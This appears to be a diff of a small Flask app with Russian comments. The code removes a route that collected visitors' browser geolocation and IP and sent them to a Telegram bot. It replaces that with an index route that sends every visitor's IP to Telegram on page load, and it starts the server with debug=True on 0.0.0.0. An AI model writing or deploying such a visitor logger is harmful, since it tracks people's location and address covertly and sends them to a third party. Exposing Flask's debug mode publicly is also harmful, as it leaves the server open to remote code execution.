@@ -15,26 +15,10 @@ def send_telegram_message(message):
 
 @app.route('/')
 def index():
-  return render_template('index.html')
-
-@app.route('/send_data', methods=['POST'])
-def send_data():
-  # Получение IP-адреса с помощью API (например, ip-api.com)
-  user_ip = requests.get('https://ip-api.com/json').json().get('query', 'Неизвестно')
-
-  # Информация с клиента (широта и долгота через JS)
-  client_data = request.json
-  latitude = client_data.get("latitude", "Неизвестно")
-  longitude = client_data.get("longitude", "Неизвестно")
-
-  # Формируем сообщение
-  message = (
-    f"IP пользователя: {user_ip}\n"
-    f"Широта: {latitude}\n"
-    f"Долгота: {longitude}\n"
-  )
-
-  # Отправляем сообщение в Telegram
+  user_ip = request.remote_addr
+  message = f"IP пользователя: {user_ip}"
   send_telegram_message(message)
+  return "IP отправлен!", 200
 
-  return "Данные отправлены боту!", 200
+if __name__ == "__main__":
+  app.run(debug=True, host='0.0.0.0')
